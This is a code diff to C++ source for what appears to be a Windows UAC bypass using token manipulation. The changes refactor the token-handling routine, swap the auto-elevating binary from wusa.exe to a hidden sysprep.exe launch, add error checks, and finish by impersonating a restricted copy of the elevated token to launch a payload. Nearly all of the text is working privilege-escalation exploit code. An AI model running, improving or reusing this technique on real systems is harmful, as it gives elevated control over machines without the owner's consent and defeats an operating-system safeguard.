@@ -11,36 +11,34 @@
 
 bool token_manipulation::run()
 {
-	std::cout << "[+] Token Manipulation" << std::endl;
-
 	// FIRST WE SEARCH FOR ANY RUNNING ELEVATED APP IN SAME SECTION
 	safe_handle process_handle;
-	
 	auto created_process = false;
-	if (!token_manipulation::find_elevated_process(process_handle)) // NO ELEVATED PROCESSES FOUND - TRIGGER ALWAYS_NOTIFY :'(
+	if (!token_manipulation::find_elevated_process(process_handle)) // NO ELEVATED PROCESSES FOUND - LAUNCH AUTO-ELEVATING EXECUTABLE & TRIGGER ALWAYS_NOTIFY :'(
 		created_process = token_manipulation::launch_auto_elevating_app(process_handle);
 
-	std::cout << "[+] Process Handle: " << std::hex << reinterpret_cast<uint32_t>(process_handle.get_handle()) << std::dec << std::endl;
-	std::cout << "[+] Process Id: " << GetProcessId(process_handle.get_handle()) << std::endl;
-
 	// OPEN ELEVATED PROCESS' TOKEN
-	HANDLE temp_token_handle;
-	auto status = ntdll::NtOpenProcessToken(process_handle.get_handle(), MAXIMUM_ALLOWED, &temp_token_handle);
-
-	auto token_handle = safe_handle(temp_token_handle);
-
-	if (!NT_SUCCESS(status))
+	safe_handle token_handle;
+	if (!token_manipulation::open_process_token(process_handle, MAXIMUM_ALLOWED, token_handle))
 	{
-		std::cout << "[!] NtOpenProcessToken failed" << std::endl;
+		std::cout << "[!] open_process_token failed" << std::endl;
 		return false;
 	}
 
+	std::cout << "[+] Process Id: " << GetProcessId(process_handle.get_handle()) << std::endl;
 	std::cout << "[+] Token Handle: " << std::hex << reinterpret_cast<uint32_t>(token_handle.get_handle()) << std::dec << std::endl;
+
+	// IF CREATED, TERMINATE AUTO-ELEVATING PROCESS
+	if (created_process)
+		TerminateProcess(process_handle.get_handle(), 1);
 
 	// DUPLICATE TOKEN WITH TOKEN_ALL_ACCESS
 	safe_handle dup_token_handle;
-	duplicate_token(token_handle, TOKEN_ALL_ACCESS, TokenPrimary, dup_token_handle);
-
+	if (!token_manipulation::duplicate_token(token_handle, TOKEN_ALL_ACCESS, TokenPrimary, dup_token_handle))
+	{
+		std::cout << "[!] duplicate_token failed" << std::endl;
+		return false;
+	}
 	std::cout << "[+] Duplicated Token Handle: " << std::hex << reinterpret_cast<uint32_t>(dup_token_handle.get_handle()) << std::dec << std::endl;
 
 	// LOWER TOKEN IL FROM HIGH -> MEDIUM
@@ -52,7 +50,11 @@ bool token_manipulation::run()
 
 	// CREATE RESTRICTED TOKEN
 	safe_handle restricted_token_handle;
-	token_manipulation::create_restricted_token(dup_token_handle, restricted_token_handle);
+	if (!token_manipulation::create_restricted_token(dup_token_handle, restricted_token_handle))
+	{
+		std::cout << "[!] create_restricted_token failed" << std::endl;
+		return false;
+	}
 
 	// IMPERSONATE USING RESTRICTED TOKEN
 	if (!token_manipulation::impersonate_user(restricted_token_handle))
@@ -75,9 +77,6 @@ bool token_manipulation::run()
 		return false;
 	}
 
-	// IF CREATED, TERMINATE AUTO-ELEVATING PROCESS
-	if (created_process)
-		TerminateProcess(process_handle.get_handle(), 1);
 
 	return true;
 }
@@ -97,7 +96,6 @@ bool token_manipulation::find_elevated_process(safe_handle& process_handle)
 
 			if (token_manipulation::is_process_admin(handle))
 			{
-				std::cin.get();
 				process_handle.set_handle(handle);
 				return true;
 			}
@@ -107,6 +105,14 @@ bool token_manipulation::find_elevated_process(safe_handle& process_handle)
 	}
 
 	return NULL;
+}
+bool token_manipulation::open_process_token(safe_handle & process_handle, ACCESS_MASK desired_access, safe_handle& token_handle)
+{
+	HANDLE temp_token_handle;
+	auto status = ntdll::NtOpenProcessToken(process_handle.get_handle(), MAXIMUM_ALLOWED, &temp_token_handle);
+	token_handle.set_handle(temp_token_handle);
+
+	return NT_SUCCESS(status);
 }
 bool token_manipulation::duplicate_token(safe_handle& token_handle, ACCESS_MASK desired_access, _TOKEN_TYPE token_type, safe_handle& duplicated_token)
 {
@@ -176,11 +182,11 @@ bool token_manipulation::launch_auto_elevating_app(safe_handle& process_handle)
 {
 	// RUN ELEVATED APP
 	SHELLEXECUTEINFOW shinfo;
-
-	shinfo.cbSize = sizeof(shinfo);
+	shinfo.cbSize = sizeof(SHELLEXECUTEINFOW);
 	shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
 	shinfo.nShow = SW_HIDE;
-	shinfo.lpFile = L"C:\\Windows\\System32\\wusa.exe";
+	shinfo.lpFile = L"C:\\Windows\\System32\\sysprep\\sysprep.exe";
+	shinfo.lpVerb = L"open";
 
 	if (!ShellExecuteExW(&shinfo))
 	{
@@ -238,6 +244,7 @@ bool token_manipulation::launch_payload()
 		&si, &pi);
 
 	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
 
 	return result;
 }
